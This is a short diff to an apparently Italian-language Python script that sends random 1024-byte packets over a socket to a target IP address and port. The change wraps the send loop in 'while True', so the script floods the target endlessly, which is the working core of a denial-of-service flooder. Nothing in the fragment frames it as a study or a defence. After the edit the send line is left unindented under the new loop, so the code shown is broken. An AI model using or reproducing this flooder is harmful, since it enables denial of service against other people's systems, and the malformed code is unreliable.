@@ -24,8 +24,8 @@ pacchetto_dati = random.randbytes(1024)
 
 
 # Invio dei pacchetti
-
-for _ in range(conto_byte):
+while True:
+	for _ in range(conto_byte):
 	s.sendto(pacchetto_dati, (ip_target, porta_target))
 
 
